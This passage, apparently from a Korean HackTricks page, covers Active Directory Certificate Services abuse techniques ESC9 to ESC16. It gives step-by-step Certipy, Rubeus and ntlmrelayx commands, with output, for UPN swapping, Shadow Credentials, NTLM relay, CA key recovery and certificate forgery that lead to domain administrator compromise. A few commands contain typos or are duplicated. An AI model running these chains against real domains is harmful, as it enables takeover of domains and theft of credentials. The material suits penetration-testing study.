그런 다음 [PetitPotam](https://github.com/ly4k/PetitPotam) 같은 기술을 사용해 인증을 강제할 수 있습니다. 도메인 컨트롤러를 대상으로 할 때는 `-template DomainController`를 지정해야 합니다.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## 보안 확장 없음 - ESC9 <a href="#id-5485" id="id-5485"></a>

### 설명

새로운 값 **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`)는 **`msPKI-Enrollment-Flag`**에 대해 ESC9로 불리며, 인증서에 **새로운 `szOID_NTDS_CA_SECURITY_EXT` security extension**을 삽입하는 것을 방지합니다. 이 플래그는 `StrongCertificateBindingEnforcement`가 `1`(기본값)로 설정되어 있을 때 의미가 생기며, `2`로 설정된 경우와 대조됩니다. ESC9의 부재가 요구사항을 변경하지 않기 때문에, Kerberos 또는 Schannel에 대해 더 약한 certificate mapping이 악용될 수 있는 시나리오(ESC10과 같은)에서 그 중요성이 커집니다.

이 플래그의 설정이 중요해지는 조건은 다음과 같습니다:

- `StrongCertificateBindingEnforcement`가 `2`로 조정되지 않았거나(기본값은 `1`), `CertificateMappingMethods`에 `UPN` 플래그가 포함되어 있는 경우.
- 인증서가 `msPKI-Enrollment-Flag` 설정 내에서 `CT_FLAG_NO_SECURITY_EXTENSION` 플래그로 표시된 경우.
- 인증서에 어떤 client authentication EKU가 지정된 경우.
- 다른 계정을 탈취하기 위해 어떤 계정에 대해 `GenericWrite` 권한이 있는 경우.

### 악용 시나리오

가령 `John@corp.local`이 `Jane@corp.local`에 대해 `GenericWrite` 권한을 가지고 있고, 목표가 `Administrator@corp.local`를 탈취하는 것이라고 가정합니다. `Jane@corp.local`가 등록할 수 있도록 허용된 `ESC9` certificate template은 `msPKI-Enrollment-Flag` 설정에 `CT_FLAG_NO_SECURITY_EXTENSION` 플래그로 구성되어 있습니다.

초기에, `Jane`의 hash는 `John`의 `GenericWrite` 덕분에 Shadow Credentials를 사용하여 획득됩니다:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
그 후, `Jane`의 `userPrincipalName`이 `Administrator`로 수정되어 `@corp.local` 도메인 부분을 의도적으로 생략합니다:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
이 수정은 `Administrator@corp.local`이 `Administrator`의 `userPrincipalName`로서 여전히 별개로 남아 있기 때문에 제약을 위반하지 않습니다.

이후, 취약함으로 표시된 `ESC9` 인증서 템플릿이 `Jane`으로 요청됩니다:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
해당 인증서의 `userPrincipalName`이 `Administrator`로 표시되며, 어떠한 “object SID”도 없습니다.

`Jane`의 `userPrincipalName`은 이후 원래 값인 `Jane@corp.local`로 되돌아갑니다:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
발급된 인증서로 인증을 시도하면 이제 `Administrator@corp.local`의 NT 해시가 출력됩니다. 인증서에 도메인 지정이 없으므로 명령어에 `-domain <domain>`을 포함해야 합니다:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## 약한 인증서 매핑 - ESC10

### 설명

도메인 컨트롤러의 두 레지스트리 키 값이 ESC10에서 언급됩니다:

- `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` 아래의 `CertificateMappingMethods` 기본값은 `0x18` (`0x8 | 0x10`)이며, 이전에는 `0x1F`로 설정되어 있었습니다.
- `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` 아래의 `StrongCertificateBindingEnforcement` 기본 설정은 `1`이며, 이전에는 `0`이었습니다.

사례 1

`StrongCertificateBindingEnforcement`가 `0`으로 구성된 경우.

사례 2

`CertificateMappingMethods`에 `UPN` 비트(`0x4`)가 포함된 경우.

### 악용 사례 1

`StrongCertificateBindingEnforcement`가 `0`으로 구성된 상태에서는, `GenericWrite` 권한을 가진 계정 A를 이용해 임의의 계정 B를 탈취할 수 있습니다.

예를 들어, `Jane@corp.local`에 대한 `GenericWrite` 권한을 가진 상황에서 공격자는 `Administrator@corp.local`를 탈취하려고 합니다. 절차는 ESC9와 유사하며, 어떤 인증서 템플릿이든 사용할 수 있습니다.

초기에 `GenericWrite`를 악용하여 Shadow Credentials를 사용해 `Jane`의 해시를 획득합니다.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
그 후, `Jane`의 `userPrincipalName`은 제약 위반을 피하기 위해 `@corp.local` 부분을 고의로 생략한 채 `Administrator`로 변경된다.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
이후 기본 `User` 템플릿을 사용해 `Jane`으로 클라이언트 인증을 허용하는 인증서를 요청합니다.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`의 `userPrincipalName`은 이후 원래 값인 `Jane@corp.local`로 되돌려집니다.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
얻은 인증서로 인증하면 `Administrator@corp.local`의 NT 해시를 얻을 수 있으며, 인증서에 도메인 정보가 없으므로 명령에 도메인을 지정해야 한다.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### 악용 사례 2

`CertificateMappingMethods`에 `UPN` 비트 플래그 (`0x4`)가 포함되어 있는 경우, `GenericWrite` 권한을 가진 계정 A는 `userPrincipalName` 속성이 없는 모든 계정 B를 손상시킬 수 있으며, 여기에는 머신 계정과 내장 도메인 관리자 `Administrator`가 포함됩니다.

여기서 목표는 `DC$@corp.local`를 손상시키는 것이며, `GenericWrite`를 활용하여 Shadow Credentials를 통해 `Jane`의 해시를 얻는 것으로 시작합니다.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`Jane`의 `userPrincipalName`은 그런 다음 `DC$@corp.local`로 설정됩니다.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
클라이언트 인증을 위한 인증서가 기본 `User` 템플릿을 사용하여 `Jane`으로 요청됩니다.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`의 `userPrincipalName`은 이 프로세스 이후 원래 값으로 복원됩니다.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Schannel을 통해 인증하려면 Certipy의 `-ldap-shell` 옵션을 사용하며, 인증 성공은 `u:CORP\DC$`로 표시됩니다.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
LDAP shell을 통해 `set_rbcd`와 같은 명령은 Resource-Based Constrained Delegation (RBCD) 공격을 가능하게 하여 domain controller를 잠재적으로 침해할 수 있습니다.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
이 취약점은 `userPrincipalName`이 없는 사용자 계정이나 `sAMAccountName`과 일치하지 않는 계정에도 해당됩니다. 기본적으로 `userPrincipalName`이 없는 기본 `Administrator@corp.local` 계정은 LDAP 권한이 높기 때문에 주요 표적이 됩니다.

## Relaying NTLM to ICPR - ESC11

### 설명

CA Server가 `IF_ENFORCEENCRYPTICERTREQUEST`로 구성되어 있지 않으면, RPC 서비스를 통해 서명 없이 NTLM relay 공격을 수행할 수 있습니다. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).

`certipy`를 사용하여 `Enforce Encryption for Requests`가 비활성화되어 있는지 열거할 수 있으며, certipy는 `ESC11` 취약점을 표시합니다.
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Abuse Scenario

릴레이 서버를 설정해야 합니다:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
참고: 도메인 컨트롤러의 경우 DomainController에서 `-template`을 지정해야 합니다.

또는 [sploutchy's fork of impacket](https://github.com/sploutchy/impacket) :
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell access to ADCS CA with YubiHSM - ESC12

### 설명

관리자는 Certificate Authority를 "Yubico YubiHSM2"와 같은 외부 장치에 저장하도록 설정할 수 있습니다.

CA 서버가 USB 포트에 직접 연결된 USB 장치이거나, CA 서버가 가상 머신인 경우 USB device server를 통해 연결된 경우, Key Storage Provider가 YubiHSM에서 키를 생성하고 사용하기 위해 인증 키(때때로 "password"라고도 함)가 필요합니다.

이 키/비밀번호는 레지스트리의 `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword`에 평문으로 저장됩니다.

참조: [here](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### Abuse Scenario

CA의 개인 키가 물리적 USB 장치에 저장되어 있고 쉘 액세스를 얻은 경우, 키를 복구할 수 있습니다.

먼저 CA 인증서(이것은 공개됨)를 확보한 다음:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
마지막으로, certutil `-sign` 명령을 사용해 CA 인증서와 그 개인 키로 임의의 새 인증서를 위조하세요.

## OID Group Link Abuse - ESC13

### 설명

`msPKI-Certificate-Policy` 속성은 인증서 템플릿에 발행 정책을 추가할 수 있게 합니다. 발행 정책을 담당하는 `msPKI-Enterprise-Oid` 객체는 PKI OID 컨테이너의 Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services)에서 찾을 수 있습니다. 이 객체의 `msDS-OIDToGroupLink` 속성을 사용해 정책을 AD 그룹에 링크할 수 있으며, 이를 통해 시스템은 인증서를 제시한 사용자를 해당 그룹의 구성원인 것처럼 권한을 부여할 수 있습니다. [참조](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

다시 말해, 사용자가 인증서를 enroll할 권한을 가지고 있고 그 인증서가 OID 그룹에 링크되어 있다면, 사용자는 해당 그룹의 권한을 상속받을 수 있습니다.

OIDToGroupLink를 찾으려면 [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1)를 사용하세요:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### 악용 시나리오

사용자 권한을 찾으려면 `certipy find` 또는 `Certify.exe find /showAllPermissions`를 사용한다.

만약 `John`이 `VulnerableTemplate`에 enroll할 권한이 있다면, 해당 사용자는 `VulnerableGroup` 그룹의 권한을 상속받을 수 있다.

해야 할 것은 템플릿을 지정하는 것뿐이며, 그러면 OIDToGroupLink 권한이 포함된 인증서를 받게 된다.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## 취약한 인증서 갱신 구성 - ESC14

### 설명

The description at https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping is remarkably thorough. 아래는 원문에서 인용한 내용이다.

ESC14는 주로 Active Directory 사용자 또는 컴퓨터 계정의 `altSecurityIdentities` 속성의 오용 또는 안전하지 않은 구성에서 발생하는 "약한 명시적 인증서 매핑(weak explicit certificate mapping)"으로 인한 취약성을 다룬다. 이 다중 값 속성은 관리자가 X.509 인증서를 인증 목적을 위해 수동으로 AD 계정에 연결할 수 있게 해준다. 값이 채워지면 이러한 명시적 매핑은 보통 인증서의 SAN에 있는 UPN 또는 DNS 이름이나 `szOID_NTDS_CA_SECURITY_EXT` 보안 확장에 포함된 SID에 의존하는 기본 인증서 매핑 로직을 재정의할 수 있다.

"약한" 매핑은 `altSecurityIdentities` 속성 내에서 인증서를 식별하는 데 사용되는 문자열 값이 너무 광범위하거나 쉽게 추측 가능하거나 고유하지 않은 인증서 필드에 의존하거나 쉽게 위조 가능한 인증서 구성 요소를 사용하는 경우 발생한다. 공격자가 권한 있는 계정에 대해 이렇게 약하게 정의된 명시적 매핑과 일치하는 속성을 가진 인증서를 획득하거나 생성할 수 있다면, 해당 인증서를 사용해 그 계정으로 인증하고 가장할 수 있다.

잠재적으로 약한 `altSecurityIdentities` 매핑 문자열의 예는 다음과 같다:

- Mapping solely by a common Subject Common Name (CN): e.g., `X509:<S>CN=SomeUser`. 공격자는 이 CN을 가진 인증서를 덜 안전한 출처에서 얻을 수 있다.
- Using overly generic Issuer Distinguished Names (DNs) or Subject DNs without further qualification like a specific serial number or subject key identifier: e.g., `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Employing other predictable patterns or non-cryptographic identifiers that an attacker might be able to satisfy in a certificate they can legitimately obtain or forge (if they have compromised a CA or found a vulnerable template like in ESC1).

`altSecurityIdentities` 속성은 다음과 같은 다양한 매핑 형식을 지원한다:

- `X509:<I>IssuerDN<S>SubjectDN` (발급자 DN과 주체 DN 전체로 매핑)
- `X509:<SKI>SubjectKeyIdentifier` (인증서의 Subject Key Identifier 확장 값으로 매핑)
- `X509:<SR>SerialNumberBackedByIssuerDN` (일반적으로 발급자 DN으로 암시적으로 한정되는 일련번호로 매핑) - 이 형식은 표준 형식이 아니며 보통은 `<I>IssuerDN<SR>SerialNumber`이다.
- `X509:<RFC822>EmailAddress` (SAN의 RFC822 이름, 일반적으로 이메일 주소로 매핑)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (인증서의 원시 공개키에 대한 SHA1 해시로 매핑 - 일반적으로 강력함)

이들 매핑의 보안성은 매핑 문자열에 사용된 인증서 식별자의 구체성, 고유성 및 암호학적 강도에 크게 의존한다. 도메인 컨트롤러에서 강력한 인증서 바인딩 모드가 활성화되어 있더라도(이는 주로 SAN UPNs/DNS 및 SID 확장에 기반한 암시적 매핑에 영향을 줌), 잘못 구성된 `altSecurityIdentities` 항목은 매핑 로직 자체가 결함이 있거나 너무 관대할 경우 여전히 가장화로 이어지는 직접적인 경로를 제공할 수 있다.

### 악용 시나리오

ESC14는 Active Directory(AD)의 **명시적 인증서 매핑**을, 특히 `altSecurityIdentities` 속성을 표적으로 삼는다. 이 속성이 설정되어 있으면(설계상 또는 잘못된 구성으로) 공격자는 매핑과 일치하는 인증서를 제시해 계정을 가장할 수 있다.

#### 시나리오 A: 공격자가 `altSecurityIdentities`에 쓸 수 있는 경우

**전제조건**: 공격자는 대상 계정의 `altSecurityIdentities` 속성에 쓰기 권한이 있거나 대상 AD 객체에 대해 다음 중 하나의 권한 형태로 이를 부여할 수 있는 권한을 가지고 있다:
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.

#### 시나리오 B: 대상이 X509RFC822(이메일)으로 약한 매핑을 가지고 있는 경우

- **전제조건**: 대상이 `altSecurityIdentities`에 약한 X509RFC822 매핑을 가지고 있다. 공격자는 피해자의 mail 속성 값을 대상의 X509RFC822 이름과 일치시키고, 피해자 이름으로 인증서를 발급받아 이를 사용해 대상 계정으로 인증할 수 있다.

#### 시나리오 C: 대상이 X509IssuerSubject 매핑을 가지고 있는 경우

- **전제조건**: 대상이 `altSecurityIdentities`에 약한 X509IssuerSubject 명시적 매핑을 가지고 있다. 공격자는 피해자 프린시펄의 `cn` 또는 `dNSHostName` 속성을 대상의 X509IssuerSubject 매핑의 주체(subject)와 일치하도록 설정할 수 있다. 그런 다음 공격자는 피해자 이름으로 인증서를 발급받아 이 인증서를 사용해 대상 계정으로 인증할 수 있다.

#### 시나리오 D: 대상이 X509SubjectOnly 매핑을 가지고 있는 경우

- **전제조건**: 대상이 `altSecurityIdentities`에 약한 X509SubjectOnly 명시적 매핑을 가지고 있다. 공격자는 피해자 프린시펄의 `cn` 또는 `dNSHostName` 속성을 대상의 X509SubjectOnly 매핑의 주체와 일치하도록 설정할 수 있다. 그런 다음 공격자는 피해자 이름으로 인증서를 발급받아 이 인증서를 사용해 대상 계정으로 인증할 수 있다.

### 구체적 조치

#### 시나리오 A

인증서 템플릿 `Machine`의 인증서를 요청
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
인증서를 저장하고 변환하세요
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
인증(인증서 사용)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
정리 (선택 사항)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
For more specific attack methods in various attack scenarios, please refer to the following: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### 설명

https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc 에 있는 설명은 매우 상세합니다. 아래는 원문 인용입니다.

Using built-in default version 1 certificate templates, an attacker can craft a CSR to include application policies that are preferred over the configured Extended Key Usage attributes specified in the template. The only requirement is enrollment rights, and it can be used to generate client authentication, certificate request agent, and codesigning certificates using the **_WebServer_** template

### 악용

다음은 참조된 [이 링크]((https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu),Click to see more detailed usage methods.

Certipy's `find` command can help identify V1 templates that are potentially susceptible to ESC15 if the CA is unpatched.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### 시나리오 A: Schannel을 통한 직접적인 가장

**1단계: 인증서를 요청하고 "Client Authentication" Application Policy와 대상 UPN을 주입합니다.** 공격자 `attacker@corp.local`는 "WebServer" V1 템플릿(which allows enrollee-supplied subject)을 사용하여 `administrator@corp.local`를 타깃으로 합니다.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: 취약한 V1 템플릿으로 "Enrollee supplies subject" 설정이 있습니다.
- `-application-policies 'Client Authentication'`: CSR의 Application Policies 확장에 OID `1.3.6.1.5.5.7.3.2`를 주입합니다.
- `-upn 'administrator@corp.local'`: 사칭을 위해 SAN에 UPN을 설정합니다.

**단계 2: 획득한 인증서를 사용하여 Schannel (LDAPS)를 통해 인증합니다.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### 시나리오 B: PKINIT/Kerberos Impersonation via Enrollment Agent Abuse

**1단계: V1 템플릿( "Enrollee supplies subject")에서 인증서를 요청하고 "Certificate Request Agent" Application Policy를 주입합니다.** 이 인증서는 공격자(`attacker@corp.local`)가 enrollment agent가 되기 위한 것입니다. 여기서는 공격자의 ID에 대해 UPN을 지정하지 않습니다. 목표는 에이전트 권한입니다.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: OID `1.3.6.1.4.1.311.20.2.1`을 주입합니다.

**2단계: "agent" 인증서를 사용해 대상 권한 있는 사용자 대신 인증서를 요청합니다.** 이것은 ESC3와 유사한 단계로, 1단계에서 획득한 인증서를 agent 인증서로 사용합니다.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**3단계: "on-behalf-of" 인증서를 사용하여 특권 사용자로 인증합니다.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## Security Extension Disabled on CA (Globally)-ESC16

### 설명

**ESC16 (Elevation of Privilege via Missing szOID_NTDS_CA_SECURITY_EXT Extension)** 는 AD CS의 구성에서 모든 인증서에 **szOID_NTDS_CA_SECURITY_EXT** 확장의 포함을 강제하지 않을 경우 공격자가 다음과 같이 이를 악용할 수 있는 시나리오를 의미합니다:

1. 인증서를 **without SID binding** 상태로 요청합니다.

2. 이 인증서를 **for authentication as any account** 용도로 사용하여, 예를 들어 높은 권한을 가진 계정(예: Domain Administrator)을 가장합니다.

자세한 원리는 다음 글을 참고하세요: https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6

### 악용

다음 내용은 [이 링크](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally)를 참고한 것입니다. 자세한 사용 방법은 해당 페이지를 확인하세요.

Active Directory Certificate Services (AD CS) 환경이 **ESC16**에 취약한지 여부를 식별하려면
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**단계 1: 피해자 계정의 초기 UPN 읽기 (선택 사항 - 복원을 위해).**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**2단계: 피해자 계정의 UPN을 대상 관리자 `sAMAccountName`으로 업데이트합니다.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**3단계: (필요한 경우) "victim" 계정의 자격 증명 확보 (예: Shadow Credentials를 통해).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Step 4: ESC16에 취약한 CA에서 _적절한 클라이언트 인증 템플릿_ (예: "User")으로 "victim" 사용자로 인증서를 요청합니다.** CA가 ESC16에 취약하기 때문에, 템플릿의 해당 확장 설정과 관계없이 발급된 인증서에서 SID 보안 확장을 자동으로 생략합니다. Kerberos credential cache 환경 변수(셸 명령):
```bash
export KRB5CCNAME=victim.ccache
```
그런 다음 인증서를 요청합니다:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**단계 5: "victim" 계정의 UPN을 원래대로 되돌립니다.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**단계 6: 대상 관리자 계정으로 인증합니다.**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## 인증서를 이용한 포리스트 침해(수동태로 설명)

### 손상된 CA에 의해 깨지는 포리스트 신뢰

**cross-forest enrollment** 구성은 비교적 간단하게 설정된다. 리소스 포리스트의 **root CA certificate**는 관리자에 의해 각 계정 포리스트(account forests)에 **게시**되며, 리소스 포리스트의 **Enterprise CA** certificates는 각 계정 포리스트의 `NTAuthCertificates` 및 AIA 컨테이너에 **추가**된다. 즉, 이 구성은 해당 PKI를 관리하는 모든 다른 포리스트에 대해 리소스 포리스트의 **CA에 대한 완전한 제어권**이 부여되도록 한다. 만약 이 CA가 공격자에 의해 **손상(compromised)**된다면, 리소스 및 계정 포리스트의 모든 사용자용 **certificates가 공격자에 의해 위조(forged)**될 수 있으며, 결과적으로 포리스트의 보안 경계가 깨지게 된다.

### 외부 주체에게 부여된 등록 권한

다중 포리스트 환경에서는 Enterprise CA가 **certificate templates**를 게시하여 **Authenticated Users 또는 foreign principals**(Enterprise CA가 속한 포리스트 외부의 사용자/그룹)에게 **등록(enrollment) 및 편집 권한**을 허용하는 경우에 주의가 필요하다.  
트러스트를 통한 인증이 이루어지면 AD에 의해 사용자의 토큰에 **Authenticated Users SID**가 추가된다. 따라서 도메인에 **Authenticated Users에 대한 등록 권한을 허용**하는 템플릿을 가진 Enterprise CA가 존재한다면, 다른 포리스트의 사용자가 해당 템플릿을 **등록(enroll)**할 수 있게 될 가능성이 있다. 마찬가지로 템플릿이 명시적으로 **foreign principal에게 등록 권한을 부여**하는 경우, **cross-forest access-control 관계가 생성**되어 한 포리스트의 주체가 다른 포리스트의 템플릿에 **등록(enroll)**할 수 있도록 허용된다.

두 경우 모두 한 포리스트에서 다른 포리스트로의 **공격 표면(attack surface)**이 증가하게 된다. 템플릿 설정은 공격자가 외부 도메인에서 추가 권한을 얻기 위해 악용될 수 있다.

## 참고자료

- [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

{{#include ../../../banners/hacktricks-training.md}}
